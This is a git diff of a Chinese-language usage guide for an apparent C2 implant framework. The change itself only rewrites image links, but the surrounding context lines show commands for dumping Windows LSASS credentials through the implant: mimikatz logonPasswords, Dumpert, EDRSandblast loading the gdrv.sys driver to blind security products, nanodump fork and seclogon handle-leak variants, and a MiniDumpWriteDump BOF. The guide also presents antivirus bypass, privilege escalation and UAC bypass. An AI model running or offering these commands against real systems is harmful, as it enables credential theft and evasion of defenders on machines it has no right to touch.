@@ -18,13 +18,13 @@
 ```
 execute_exe "D:\TOOL\iom_test\mimikatz.exe" -- log "privilege::debug" "sekurlsa::logonPasswords full" exit
 ```
-![mimikatz](/IoM/assets/usage/lsass/mimikatz.png)
+![mimikatz](../../assets/usage/lsass/mimikatz.png)
 
 和execute_exe相比, inline_exe的隐蔽性会更好, 但是稳定性方面一些不稳定操作crash或查杀会导致implant直接崩溃
 ```
 inline_exe "D:\TOOL\iom_test\Outflank-Dumpert.exe"
 ```
-![Dumpert](/IoM/assets/usage/lsass/dumpert.png)
+![Dumpert](../../assets/usage/lsass/dumpert.png)
 
 ### C\#
 
@@ -60,9 +60,9 @@ inline_dll "D:\c2测试目录\Dumpert\Dumpert-DLL\x64\Release\Outflank-Dumpert-D
 
 4. 检测到lsass.dmp文件转存储到了本地磁盘的查杀lsass.dmp文件本身
 
-360核晶, [附截图](/IoM/assets/usage/lsass/360hvm.png)
+360核晶, [附截图](../../assets/usage/lsass/360hvm.png)
 
-Windows Defender , [附截图](/IoM/assets/usage/lsass/windows_defender.png)
+Windows Defender , [附截图](../../assets/usage/lsass/windows_defender.png)
 
 下面介绍几个bypass方法。
 
@@ -78,9 +78,9 @@ upload "D:\EDRSandblast\x64\Release\gdrv.sys" "C:\temp\gdrv.sys"
 execute_exe "D:\EDRSandblast\x64\Release\EDRSandblast_LsassDump.exe"
 ```
 
-![EDRSandblast_LsassDump.png](/IoM/assets/usage/lsass/EDRSandblast_LsassDump.png)
+![EDRSandblast_LsassDump.png](../../assets/usage/lsass/EDRSandblast_LsassDump.png)
 
-![temp_edrsandblast](/IoM/assets/usage/lsass/temp_edrsandblast.png)
+![temp_edrsandblast](../../assets/usage/lsass/temp_edrsandblast.png)
 
 ### NanoDump
 nanodump是一个一种灵活的工具，可创建 LSASS 进程的小型转储
@@ -93,13 +93,13 @@ nanodump -- --fork --write "C:\lsass.dmp"
 .\restore_signature.exe lsass.dmp
 python -m pypykatz lsa minidump lsass.dmp
 ```
-![nanodump.png](/IoM/assets/usage/lsass/nanodump2.png)
+![nanodump.png](../../assets/usage/lsass/nanodump2.png)
 
 2. 使用 seclogon Leak Remote 在记事本进程中泄漏 LSASS 句柄，复制该句柄以访问 LSASS，然后通过创建分叉并使用有效签名(--valid)，下载转储来间接读取它
 ```
 nanodump -- --seclogon-leak-remote "C:\Windows\notepad.exe" --fork --valid
 ```
-![seclogon-leak-remote.png](/IoM/assets/usage/lsass/seclogon-leak-remote.png)
+![seclogon-leak-remote.png](../../assets/usage/lsass/seclogon-leak-remote.png)
 
 ### MiniDumpWriteDump
 
@@ -108,7 +108,7 @@ nanodump -- --seclogon-leak-remote "C:\Windows\notepad.exe" --fork --valid
 bof "D:\BOFs\MiniDumpWriteDump\minidumpwritedump.x64.o" -- int:648 str:"C:\lsass.dmp"
 ```
 
-![MiniDumpWriteDump](/IoM/assets/usage/lsass/MiniDumpWriteDump.png)
+![MiniDumpWriteDump](../../assets/usage/lsass/MiniDumpWriteDump.png)
 
 ## 其他:
 
@@ -116,11 +116,11 @@ bof "D:\BOFs\MiniDumpWriteDump\minidumpwritedump.x64.o" -- int:648 str:"C:\lsass
 
 用于提权的 ElevateKit 提权截图示例如下:
 
-![ElevateKit](/IoM/assets/usage/lsass/ElevateKit.png)
+![ElevateKit](../../assets/usage/lsass/ElevateKit.png)
 
 UAC Bypass截图:
 
-![UAC Bypass](/IoM/assets/usage/lsass/uac-bypass.png)
+![UAC Bypass](../../assets/usage/lsass/uac-bypass.png)
 
 ## 参考
 - https://github.com/fortra/nanodump
